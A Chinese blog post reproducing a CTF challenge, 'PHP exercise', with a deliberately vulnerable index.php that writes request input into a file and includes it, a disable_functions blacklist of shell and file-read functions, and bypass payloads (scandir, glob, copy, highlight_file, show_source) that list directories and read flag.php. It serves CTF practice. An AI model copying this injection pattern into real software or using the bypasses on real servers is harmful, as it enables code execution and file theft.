---
title: 第十届全国大学生信息安全竞赛-PHP execise-简单复现
date: 2017-07-18 00:18:02
tags: CTF
---
### 0x00 环境搭建
原题代码改版：
<!--more-->
`index.php`文件
```
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>Examples</title>
        <meta name="description" content="">
        <meta name="keywords" content="">
        <link href="" rel="stylesheet">
    </head>
    <body>
        <div class="inner-cover">
            <h1 class="cover-heading">Welcome to PHP~ </h1>
            <p class="lead">PHP is the best laugage!</p>
            <form action="index.php" method="POST">
                Name: <input type="text" name="code"><br>
                <input type="submit">
            </form>
        </div>
        <div class="col-md-12">
            <br><hr><hr><br>
            <p class="lead">
                <?php
                    if (isset($_REQUEST['code'])) {
                $code= "<?php ".$_REQUEST['code']." ?>";
                file_put_contents("tmp.php", $code);
                echo "OUTCOME: \n";
                include "tmp.php";
                }
                ?>
            </p>
        </div>
    </body>
</html>
```
在相同目录下建立`tmp.php`和`flag.php`文件

![](http://ok508kqsu.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170718002550.jpg)

还要在PHP.INI，找到这行：

`disable_functions =`

在后面加上禁用的函数：
```
assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,fopen,file_get_contents,fread,file_get_contents,file,readfile,opendir,readdir,closedir,rewinddir, 
```



### 0x01 解题思路
主要是列目录，读文件。
看了表哥们的writeup，有两种方法列目录:

1)`foreach (glob("./*") as $filename) {  echo $filename."<br>"; }`

![](http://ok508kqsu.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170718002551.jpg)

2)`print_r( scandir("./"));`

![](http://ok508kqsu.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170718004347.jpg)

读文件有三种方法，但应该不止。

1)`copy('flag.php','flag.txt');`

![](http://ok508kqsu.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170718005259.jpg)

2)`highlight_file("flag.php");`

![](http://ok508kqsu.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170718005360.jpg)

3)`show_source("flag.php");`

![](http://ok508kqsu.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170718005461.jpg)

### 0x02 总结

个人觉得这题还是有点意思，比赛的时候没有解出来，主要是PHP功底太过弱鸡。。
写出来主要是防CTF中的各种套路，为下次做准备。